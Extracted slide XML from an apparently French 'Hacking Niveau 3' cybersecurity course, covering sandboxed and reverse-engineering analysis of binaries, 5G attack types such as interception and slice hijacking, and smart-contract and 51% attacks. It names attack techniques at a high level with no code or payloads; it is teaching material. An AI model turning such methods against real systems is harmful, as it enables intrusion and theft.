      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5082610" y="1581"/>
          <a:ext cx="4155051" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Machine virtuelle ou bac à sable.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5082610" y="1581"/>
        <a:ext cx="4155051" cy="801439"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{DBC49395-2DDF-4948-A90C-53C9AFEAA835}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1003380"/>
          <a:ext cx="9237662" cy="8014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E99BAC-F0EE-4D55-A9F9-4EDB88289205}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="242435" y="1183704"/>
          <a:ext cx="440791" cy="4407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C973D-EFA4-4E94-9A39-9F2371E109E3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="925662" y="1003380"/>
          <a:ext cx="4156947" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Lancer le programme avec des outils de monitoring.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="925662" y="1003380"/>
        <a:ext cx="4156947" cy="801439"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B7A2A0AE-78D5-4D09-8D0A-0BC04B8B7380}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5082610" y="1003380"/>
          <a:ext cx="4155051" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Capture des traces système (Process Monitor).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5082610" y="1003380"/>
        <a:ext cx="4155051" cy="801439"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{C28C0C08-81C3-4445-9165-F6FDDFEBF58F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2005179"/>
          <a:ext cx="9237662" cy="8014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66532A-AD73-46E9-B51B-22A8529BC7C2}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="242435" y="2185503"/>
          <a:ext cx="440791" cy="4407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69E90-A6E7-4D11-8D31-D75FAF9BE2AA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="925662" y="2005179"/>
          <a:ext cx="4156947" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Déboguer étape par étape :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="925662" y="2005179"/>
        <a:ext cx="4156947" cy="801439"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{0EE8A610-5B51-4745-96D6-A8809083FC15}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5082610" y="2005179"/>
          <a:ext cx="4155051" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Inspecter les instructions exécutées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5082610" y="2005179"/>
        <a:ext cx="4155051" cy="801439"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{460600BD-FB8B-4C3D-95AE-2D59A7361881}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3006979"/>
          <a:ext cx="9237662" cy="8014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9265FF-8762-4B1F-9EB3-7A7223673200}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="242435" y="3187303"/>
          <a:ext cx="440791" cy="4407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3CC0A3-CBAD-4447-A54D-87731C0898D0}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="925662" y="3006979"/>
          <a:ext cx="4156947" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Capturer les résultats :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="925662" y="3006979"/>
        <a:ext cx="4156947" cy="801439"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{99E0A5F1-7337-48E9-932F-C493C90AAA4A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5082610" y="3006979"/>
          <a:ext cx="4155051" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Obtenir les clés décryptées, les données en mémoire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5082610" y="3006979"/>
        <a:ext cx="4155051" cy="801439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E01C27-E3E3-44B9-B315-B99C36AAB262}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="619125"/>
          <a:ext cx="9237662" cy="11429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910377-65C7-4D9F-8B84-04F431F62B3D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="345757" y="876300"/>
          <a:ext cx="628649" cy="628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80A86-CF0B-4199-A3F3-18AAD564C169}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1320164" y="619125"/>
          <a:ext cx="4156947" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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Principe :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1320164" y="619125"/>
        <a:ext cx="4156947" cy="1142999"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{6D87A272-B9A5-48FD-AEA5-37DD7DCF6FBF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5477112" y="619125"/>
          <a:ext cx="3760549" cy="1142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67" tIns="120967" rIns="120967" bIns="12096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Exécuter un programme dans un environnement isolé.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5477112" y="619125"/>
        <a:ext cx="3760549" cy="1142999"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{1AD40AF1-86FF-4BB6-9FBF-6A6EFD8CBA2E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2047875"/>
          <a:ext cx="9237662" cy="11429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4DF0E4-8B0D-4203-A077-AEE821D8C54B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="345757" y="2305050"/>
          <a:ext cx="628649" cy="628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F42FC-3A28-4295-97FD-7FC5C7EBDC21}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1320164" y="2047875"/>
          <a:ext cx="4156947" cy="1142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67" tIns="120967" rIns="120967" bIns="1209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Objectifs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1320164" y="2047875"/>
        <a:ext cx="4156947" cy="1142999"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5B42C973-D9C7-424E-8220-1AA60370009A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="5477112" y="2047875"/>
          <a:ext cx="3760549" cy="1142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67" tIns="120967" rIns="120967" bIns="120967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Prévenir les dommages au système hôte.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Observer le comportement sans interférences.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="5477112" y="2047875"/>
        <a:ext cx="3760549" cy="1142999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7B458-017E-7B48-9C4E-F2D84DCF592E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="489112"/>
          <a:ext cx="5334000" cy="1871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562356" rIns="413978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/>
            <a:t>Analyser un binaire pour comprendre sa logique interne.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="489112"/>
        <a:ext cx="5334000" cy="1871100"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B1626687-0E39-4C41-AAF7-9F429CBD3923}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="90592"/>
          <a:ext cx="3733799" cy="7970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Principe :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="305608" y="129500"/>
        <a:ext cx="3655983" cy="719223"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F6F95642-EF6D-2146-B83E-941680AE978C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2904532"/>
          <a:ext cx="5334000" cy="23388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562356" rIns="413978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/>
            <a:t>Identifier les vulnérabilités ou les algorithmes.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/>
            <a:t>Développer des exploits ou des patchs.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2904532"/>
        <a:ext cx="5334000" cy="2338874"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{25C8C000-D8A0-F64B-AF09-1715FB572A2B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2506012"/>
          <a:ext cx="3733799" cy="797039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Objectifs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="305608" y="2544920"/>
        <a:ext cx="3655983" cy="719223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1D0DF-D46E-1546-83A9-8A437D21AC1F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="416909"/>
          <a:ext cx="5334000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479044" rIns="413978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/>
            <a:t>Observer les fonctions critiques utilisées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="416909"/>
        <a:ext cx="5334000" cy="1304100"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{30D79FC0-C01B-4C4D-BEC0-76C1A83A1BB2}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="77429"/>
          <a:ext cx="3733799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Traçage des appels API.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="299844" y="110573"/>
        <a:ext cx="3667511" cy="612672"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B71B6B79-AB4C-094E-9496-D4C0D449B1FB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2184689"/>
          <a:ext cx="5334000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53805"/>
              <a:satOff val="-466"/>
              <a:lumOff val="38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479044" rIns="413978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/>
            <a:t>Identifier les clés ou données cachées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2184689"/>
        <a:ext cx="5334000" cy="1304100"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{122098E4-D990-224F-84F6-59BB8A95FDB1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1845209"/>
          <a:ext cx="3733799" cy="678960"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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Décodage des chaînes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="299844" y="1878353"/>
        <a:ext cx="3667511" cy="612672"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{C2E22E09-6AA2-F144-B3F4-5DDC49AD4DCD}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3952469"/>
          <a:ext cx="5334000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507610"/>
              <a:satOff val="-932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3978" tIns="479044" rIns="413978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/>
            <a:t>Reverser des algorithmes (chiffrement, compression).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3952469"/>
        <a:ext cx="5334000" cy="1304100"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{C2512DD6-937F-0243-BCFF-3AA7FD29C507}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="3612989"/>
          <a:ext cx="3733799" cy="678960"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1507610"/>
            <a:satOff val="-932"/>
            <a:lumOff val="76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129" tIns="0" rIns="141129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Analyse de la logique.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="299844" y="3646133"/>
        <a:ext cx="3667511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FA6DB5-6A2C-CE4F-AE7A-BCB1B3EA4539}" type="datetimeFigureOut">
              <a:rPr lang="fr-FR" smtClean="0"/>
              <a:t>01/12/2024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10214-75FD-1D4A-8D15-A077EF2B180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0191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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>Obfuscation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" baseline="0" dirty="0"/>
              <a:t> : montrer l’exemple avec le JS XSS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81D16325-852B-D34F-81BB-8DB36247E48B}" type="slidenum">
              <a:rPr lang="fr-FR" altLang="fr-FR" smtClean="0"/>
              <a:pPr/>
              <a:t>50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33512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0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83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55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023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75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57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30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0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46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08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11/25/24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902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3281D-A46F-4842-9340-4CBC29E1B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101010 data lines to infinity">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E0CF8955-BD71-E063-C864-4ED901DE87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312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8FCC5F-532C-6623-CF9F-900712EB1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6952388" cy="3260635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Hacking Niveau 3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3FECB8-44EE-4A45-9F7B-66ECF1C3C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8595"/>
            <a:ext cx="971155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37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56B1D0-4607-146B-CB1E-136E9036F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 dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Objectifs</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR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3A5EE3-2BF0-269B-FC9C-31B2A9F552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430192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989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804B9-49BF-3D0C-374F-FDA9A3F8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Cybersécurité et technologies émergentes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B32B7-1AA2-D1F5-6ED8-5A00FB8DF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Sous-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>thème</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> : La 5G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Impact sur la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>cybersécurité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/>
              <a:t>Augmentation de la surface </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’attaque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raison de la multiplication des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dispositifs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>connectés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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Exemples</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>spécifiques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> :</a:t>
            </a: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Attaques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sur les communications ultra-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rapides</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : interception et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>détournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des flux.</a:t>
            </a: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/>
              <a:t>Manipulation de réseaux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>privés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>virtuels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (slice networks).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b="1" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>d’attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Une </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>découverte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans les stations de base 5G </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>permettant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>accès</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>autorisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> aux données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sensibles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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0820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41BE-7029-41F3-EADC-7CD92289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 5G : Les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>principaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> types </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'attaques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4EDA8-2D92-F5E5-F209-4E3AA1B62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Attaques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> réseau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Interception des communications via man-in-the-middle.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Détournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> slicing pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>cibler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des segments </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>spécifiques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Attaques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> physiques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Exploitation des stations de base non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurisées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Sabotage des infrastructures 5G.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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>d'attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>En 2023, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> équipe de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chercheurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>démontré</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> comment </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>compromettre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un réseau 5G pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>injecter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fausses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> données.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6300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E88F98-1BCC-A7A0-7B90-FAF1ACCC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Cybersécurité et technologies émergentes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966B1-AF1B-AC6B-BC2E-035A9DF7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b="1" dirty="0"/>
              <a:t>Sous-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>thème</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> : Blockchain et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>contrats</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>intelligents</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Risques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>principaux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Exploits des smart contracts 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Bugs dans le code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>permettant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le vol de crypto-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>monnaie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/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Cas célèbre : Hack de DAO (2016) avec 60M$ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>volés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Manipulation des consensus (51% Attack).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>récent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>En 2022,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vulnérabilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans un </a:t>
            </a:r>
            <a:r>
